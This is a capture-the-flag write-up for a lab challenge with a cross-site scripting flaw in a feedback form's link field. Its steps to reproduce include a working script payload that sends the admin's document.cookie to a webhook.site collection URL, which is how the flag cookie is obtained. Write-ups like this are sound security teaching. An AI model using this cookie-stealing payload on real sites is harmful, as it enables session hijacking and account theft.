# Challenge `My favorite cookies` writeup

- Vulnerability: What type of vulnerability is being exploited
  - _Cross-site scripting (XSS)_
- Where: Where is the vulnerability present
  - _Feedback form (link for bug/feature request field)_
- Impact: What results of exploiting this vulnerability
  - _Allows to run arbitrary JavaScript code in the victim's browser by injecting crafted payloads in the link field of the feedback form, making it possible to redirect the victim's cookies to a controlled server_

NOTE: Knowing that the admin is curious about all feedback received and will probably open the link referenced as the source of the feedback, it is possible to craft a payload that redirects the victim's cookies to a controlled server.
This can be done by setting up a server that listens for incoming requests and logs them. The server was set using `Webhook.site` at `https://webhook.site/c4fb7495-1912-4963-afd0-93a0676c6909`.

## Steps to reproduce

1. Access the vulnerable application homepage at `/` endpoint.
2. Inject the following payload in the link field of the feedback form in order to redirect the victim's cookies to a controlled server:
```html
http://mustard.stt.rnl.tecnico.ulisboa.pt:23251/?search=<script>window.open("https://webhook.site/c4fb7495-1912-4963-afd0-93a0676c6909/?cookie="%2Bdocument.cookie)</script>
```

3. Submit the feedback request and when the admin opens the link present in the feedback form, the script is executed in his browser, redirecting his cookies to the controlled server and logging them under the `cookie` query parameter in the server's dashboard. The flag is available at the cookie value of the `SECRET` cookie.
